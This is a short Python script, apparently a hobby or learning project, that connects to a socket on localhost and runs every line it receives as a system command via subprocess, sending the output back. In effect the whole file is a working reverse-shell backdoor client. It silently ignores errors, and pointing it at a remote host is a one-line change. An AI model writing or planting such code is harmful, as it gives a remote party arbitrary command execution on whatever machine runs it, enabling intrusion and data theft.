import socket 
from subprocess import Popen, PIPE
from getkey import getkey
from sys import exit

HOST = 'localhost'
PORT = 50007
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    #s.sendall(b'hello world')
    while True:
        data = s.recv(1024)
        args = data.split()
        try:
            process = Popen(args, stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()
            print('received', repr(data))
            print(stdout)
            s.sendall(stdout)
        except:
            pass
